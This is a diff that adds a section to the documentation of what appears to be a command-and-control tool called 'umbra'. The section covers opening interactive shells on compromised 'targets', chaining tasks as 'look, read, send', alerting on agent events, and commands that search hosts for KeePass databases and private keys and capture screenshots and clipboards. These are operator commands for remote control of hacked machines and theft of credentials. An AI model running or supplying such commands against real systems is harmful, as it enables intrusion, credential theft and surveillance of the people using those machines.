@@ -129,6 +129,69 @@ umbra[-]> tag web-01 finance
 umbra[-]> policy web-01 sleep=120 jitter=45
 ```
 
+## 3b. Interactive sessions, chains and alerts
+
+### An interactive session
+
+A session is a process on the target that the operator types into.  The
+beacon keeps it open, streams what the process prints and takes what the
+operator writes:
+
+```bash
+umbra session web-01                     # the platform's own shell
+umbra session web-01 --cmd "python3"    # a specific program
+umbra session web-01 --input "id"       # write one line and wait
+```
+
+Inside the console the same thing is one command: `session [cmd]`.  The
+session survives a re-connect, so it keeps working when the check-in
+interval is a minute; the beacon holds the connection open while a session is
+live, so the output arrives as it happens instead of at the next check-in.
+
+### A multi-stage task
+
+A chain runs several tasks one after the other, and the output of a stage
+becomes the input of the next one.  `{{output}}` is the placeholder:
+
+```bash
+umbra chain web-01 --stages '[
+  {"kind":"shell","args":{"cmd":"ls /etc/umbra"}},
+  {"kind":"shell","args":{"cmd":"cat {{output}}"}}
+]'
+```
+
+A chain is the shape of most real work: look, read, send.  The stages are
+ordinary tasks in the history, so the console can still show what each stage
+did.
+
+### Alerts
+
+The server can watch its own event stream, so a console does not have to:
+
+```json
+"alerts": [
+  {"name": "dc-offline", "event": "agent.offline", "tag": "dc", "cooldown_s": 300},
+  {"name": "failed-task", "event": "task.result", "task_kind": "bof", "cooldown_s": 60}
+]
+```
+
+A rule matches on the event kind, on a tag of the agent, on the beginning of
+the agent id and on the kind of the task.  When it matches, the server logs
+the event loudly and pushes an `alert` event, which the console shows like
+any other event.  The cooldown keeps a noisy agent from alerting on every
+check-in.  `umbra alerts` lists the rules the server is using.
+
+### Finding things on the target
+
+```bash
+umbra triage web-01 /usr/bin/suspicious     # size, digest, format, entropy
+umbra find web-01 "*.kdbx" --path /home     # by name (a glob or a substring)
+umbra find web-01 --content "BEGIN PRIVATE KEY" --path /etc
+umbra netinfo web-01                        # interfaces, routes, neighbours
+umbra screenshot web-01 screen.png          # the screen of the target
+umbra clipboard web-01                      # the clipboard of the target
+```
+
 ## 4. Beacon tuning
 
 The server dictates cadence at handshake time (`beacon.sleep` / `beacon.jitter`)
